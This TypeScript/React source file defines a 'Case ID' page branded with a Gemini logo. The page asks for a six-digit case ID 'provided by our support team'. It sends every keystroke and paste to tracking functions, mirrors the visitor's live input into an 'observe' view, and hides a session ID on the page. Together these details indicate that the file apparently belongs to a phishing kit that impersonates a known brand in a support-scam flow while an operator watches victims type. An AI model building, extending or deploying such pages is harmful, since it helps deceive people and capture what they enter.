import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";

export const Route = createFileRoute("/gi/caseid")({
  head: () => ({ meta: [{ title: "Case ID" }] }),
  component: GiCaseIdPage,
});

function GiCaseIdPage() {
  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId, isObserve } =
    useGiTracking();
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const refs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      if (d.field !== "case_id" && d.field !== "Case ID") return;
      const raw = String(d.value ?? "").replace(/\D/g, "").slice(0, 6);
      const next = ["", "", "", "", "", ""];
      for (let i = 0; i < raw.length; i++) next[i] = raw[i];
      setDigits(next);
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const setDigit = (i: number, v: string) => {
    if (!/^\d*$/.test(v)) return;
    const next = [...digits];
    next[i] = v.slice(-1);
    setDigits(next);
    trackInput("case_id", next.join(""), "text");
    if (v && i < 5) refs.current[i + 1]?.focus();
    if (next.every((d) => d !== "")) trackSubmit("case_id", next.join(""));
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    const next = [...digits];
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i];
    setDigits(next);
    trackInput("case_id", next.join(""), "text");
    refs.current[Math.min(pasted.length, 5)]?.focus();
    if (next.every((d) => d !== "")) trackSubmit("case_id", next.join(""));
  };

  const allFilled = digits.every((d) => d !== "");
  const handleContinue = () => {
    if (!allFilled) return;
    trackClick("Case ID Continue");
    giNavigate("/gi/loading");
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#fff", color: "#010304", fontFamily: GI_FONT_FAMILY }}>
      <GiFontStyle />
      <style>{`
        .gi-digit { width: 100%; aspect-ratio: 1; text-align: center; font-size: 24px; font-weight: 500; border-radius: 12px; border: 1.5px solid rgba(1,3,4,0.15); background: #fff; color: #010304; outline: none; caret-color: ${GI_ACCENT}; transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s; font-family: inherit; }
        .gi-digit:hover { border-color: rgba(1,3,4,0.3); }
        .gi-digit:focus { border-color: ${GI_ACCENT}; box-shadow: 0 0 0 2px rgba(38,221,249,0.15); transform: scale(1.05); }
        .gi-digit.filled { border-color: ${GI_ACCENT}; }
        @media (max-width: 640px) {
          .gi-digit-grid { gap: 6px !important; }
          .gi-digit { font-size: 18px; }
        }
      `}</style>
      <header style={{ display: "flex", alignItems: "center", padding: "16px 24px" }}><GeminiLogo /></header>
      <main style={{ display: "flex", justifyContent: "center", flexGrow: 1, padding: "80px 16px 40px", alignItems: "flex-start" }}>
        <div style={{ width: "100%", maxWidth: 400 }}>
          <h1 style={{ fontSize: 28, fontWeight: 600, margin: "0 0 8px", letterSpacing: "-0.02em" }}>Case ID</h1>
          <p style={{ fontSize: 15, color: "rgba(1,3,4,0.5)", margin: "0 0 36px", lineHeight: "22px" }}>Enter the 6-digit case ID provided to you by our support team.</p>
          <div className="gi-digit-grid" style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12 }}>
            <input type="hidden" name="case_id" value={digits.join("")} readOnly />
            {digits.map((d, i) => (
              <input key={i} ref={(el) => { refs.current[i] = el; }} name={`case_id_${i}`} type="text" inputMode="numeric" maxLength={1} value={d} onChange={(e) => setDigit(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)} onPaste={i === 0 ? handlePaste : undefined} className={`gi-digit ${d ? "filled" : ""}`} />
            ))}
          </div>
          <button onClick={handleContinue} disabled={!allFilled} style={{ width: "100%", height: 52, marginTop: 24, border: "none", borderRadius: 1000, background: allFilled ? "#010304" : "rgba(1,3,4,0.08)", color: allFilled ? "#fff" : "rgba(1,3,4,0.3)", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: allFilled ? "pointer" : "not-allowed" }}>Continue</button>
        </div>
      </main>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
